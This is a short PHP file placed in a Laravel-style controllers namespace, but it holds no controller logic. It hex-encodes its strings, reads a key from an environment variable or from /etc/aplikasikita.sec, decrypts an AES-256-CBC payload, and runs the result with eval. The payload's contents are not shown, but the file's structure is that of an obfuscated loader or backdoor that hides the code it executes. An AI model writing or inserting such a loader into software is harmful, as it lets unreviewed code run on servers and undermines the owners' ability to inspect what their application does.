<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('wWH7/VPHZb4e+bBsfW1rww==');

$c=base64_decode(

'fZKcHDUk8oGpM5SR2IpfWzTv1BbeBqjIZqFN/3iMazX/s643upvYOofSesWzCwNRmYL8qWdAYeoK' .
'LPCVSJP4+M0V36wuwdx5vokYkaB/HjLNi7N7zBurcvG6uFbYIQwkfsSert2yobfQW+uNGu1AeAwv' .
'ajE65xZY3NcB7UYQ3nVS2COLxqpvrk0xcv6HdwLmril+X1gvPmNcDIBfKBblMWzEVIKdIUmhCVgh' .
'NRyOU196SyEXPit7/u6iG9UM8JAnjOdrHmJr3elxhRZ8taXWCtuLvnSX5uqVt4tdRMR+8sU='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

